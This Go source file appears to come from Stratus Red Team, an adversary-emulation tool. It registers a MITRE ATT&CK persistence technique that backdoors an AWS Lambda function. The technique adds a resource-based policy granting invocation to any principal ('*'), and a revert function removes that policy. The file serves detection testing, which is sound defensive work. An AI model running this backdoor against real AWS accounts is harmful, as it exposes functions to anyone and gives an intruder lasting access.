package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/lambda"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.persistence.backdoor-lambda-function",
		FriendlyName: "Backdoor Lambda Function Through Resource-Based Policy",
		Description: `
Establishes persistence by backdooring a lambda function to allow its invocation from an external AWS account.

Warm-up: Create the pre-requisite Lambda function.

Detonation: Modify the Lambda function resource-base policy to allow access from an external AWS account.
`,
		Platform:                   stratus.AWS,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

const policyStatementId = "backdoor"

func detonate(params map[string]string) error {
	lambdaClient := lambda.NewFromConfig(providers.AWS().GetConnection())
	lambdaFunctionName := params["lambda_function_name"]

	log.Println("Backdooring the resource-based policy of the Lambda function " + lambdaFunctionName)
	result, err := lambdaClient.AddPermission(context.Background(), &lambda.AddPermissionInput{
		FunctionName: aws.String(lambdaFunctionName),
		Action:       aws.String("lambda:InvokeFunction"),
		Principal:    aws.String("*"), // I intended to share it only with a specific account ID, but couldn't get it working.
		StatementId:  aws.String(policyStatementId),
	})

	if err != nil {
		return errors.New("unable to backdoor Lambda function: " + err.Error())
	}

	log.Println(*result.Statement)

	return nil
}

func revert(params map[string]string) error {
	lambdaClient := lambda.NewFromConfig(providers.AWS().GetConnection())
	lambdaFunctionName := params["lambda_function_name"]

	log.Println("Removing the backdoor statement in the resource-based policy of the Lambda function " + lambdaFunctionName)
	_, err := lambdaClient.RemovePermission(context.Background(), &lambda.RemovePermissionInput{
		FunctionName: aws.String(lambdaFunctionName),
		StatementId:  aws.String(policyStatementId),
	})

	if err != nil {
		return errors.New("unable to remove backdoor statement of Lambda function: " + err.Error())
	}

	return nil
}
